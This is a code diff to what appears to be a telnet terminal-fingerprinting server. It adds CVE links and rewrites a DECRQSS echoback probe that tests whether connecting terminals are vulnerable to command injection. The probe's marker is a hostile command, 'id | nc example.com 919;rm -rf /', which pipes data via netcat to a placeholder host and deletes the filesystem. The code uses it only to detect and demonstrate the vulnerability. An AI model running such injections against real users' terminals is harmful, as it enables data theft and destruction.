@@ -610,7 +610,9 @@ def _build_vulnerabilities_rows(
     for cve_id, result in sorted(cve_results.items()):
         if result and result is not False:
             escaped = result if isinstance(result, str) else repr(result)
-            pairs.append((cve_id, term.bold_firebrick1("Vulnerable: " + escaped)))
+            url = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
+            label = _osc8(url, cve_id)
+            pairs.append((label, term.bold_firebrick1("Vulnerable: " + escaped)))
 
     return pairs
 
@@ -1034,9 +1036,9 @@ def _repl_prompt(term: "blessed.Terminal") -> None:
     legend = (
         f"{bk(term, 't')}erminal or te{bk(term, 'l')}net details, "  # codespell:ignore te
         f"{bk(term, 's')}ummarize or {bk(term, 'u')}pdate database, "
-        f"{bk(term, 'q')}uit: "
+        f"{bk(term, 'q')}uit"
     )
-    echo(f"\r{term.clear_eos}{term.normal}{legend}")
+    echo(f"\r{term.clear_eos}{term.normal}{legend}\r\n: ")
 
 
 def _read_line(term: "blessed.Terminal") -> str:
@@ -1063,15 +1065,30 @@ def _read_line(term: "blessed.Terminal") -> str:
             echo(ch)
 
 
-def _send_decrqss_probe() -> None:
-    """Send a DECRQSS query with injected command payload.
+_DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"
 
-    CVE-2008-2383 / CVE-2022-45872: vulnerable terminals echo unsupported
-    DECRQSS query parameters verbatim back to the input stream, enabling
-    arbitrary command injection.
+
+def _try_decrqss_injection() -> bool:
+    """Attempt DECRQSS command injection and return whether it succeeded.
+
+    Sends a DECRQSS query whose payload contains a marker string.
+    Vulnerable terminals (CVE-2008-2383 / CVE-2022-45872) echo the
+    payload back to our stdin.  We do a short raw read to capture the
+    response before blessed's inkey() can misparse the ESC byte.
     """
-    sys.stdout.write("\x1bP$qsudo command injected\r\x1b\\")
+    import select
+
+    sys.stdout.write(f"\x1bP$q{_DECRQSS_INJECT_MARKER}\r\x1b\\")
     sys.stdout.flush()
+
+    fd = sys.stdin.fileno()
+    ready, _, _ = select.select([fd], [], [], 0.5)
+    if not ready:
+        return False
+
+    buf = os.read(fd, 4096)
+    logger.debug("DECRQSS response: %r", buf)
+    return _DECRQSS_INJECT_MARKER.encode("latin-1") in buf
 
 
 def _paginate(term: "blessed.Terminal", text: str, **_kw: Any) -> None:
@@ -1361,18 +1378,35 @@ def _fingerprint_repl(
     }
 
     db_cache = None
+    decrqss_tried = False
+
+    # Check if CVE-2008-2383 was previously detected as vulnerable
+    cve_results = data.get("cve_results", {})
+    decrqss_vulnerable = bool(cve_results.get("CVE-2008-2383"))
 
     while True:
         _repl_prompt(term)
         while term.inkey(timeout=0):
             pass
-        _send_decrqss_probe()
-        cmd = _read_line(term).strip().lower()
 
-        if "sudo command injected" in cmd:
-            echo(term.bold_red("How does it feel to live so dangerously?") + "\n")
-            logger.info("%s: repl DECRQSS injection received", ip)
-            continue
+        if decrqss_vulnerable and not decrqss_tried:
+            decrqss_tried = True
+            if _try_decrqss_injection():
+                echo(
+                    f"{term.bold_red}{_DECRQSS_INJECT_MARKER}{term.normal}\r\n"
+                    f"{term.bold_red}^^ injected via CVE-2008-2383 DECRQSS"
+                    f" echoback{term.normal}\r\n\r\n"
+                )
+                logger.info("%s: DECRQSS injection demonstrated", ip)
+                # drain any remaining DCS response bytes from stdin
+                import select
+                while select.select([sys.stdin.fileno()], [], [], 0.2)[0]:
+                    os.read(sys.stdin.fileno(), 4096)
+                while term.inkey(timeout=0):
+                    pass
+                continue
+
+        cmd = _read_line(term).strip().lower()
 
         if cmd in _commands:
             logger.info("%s: repl %s", ip, _commands[cmd])
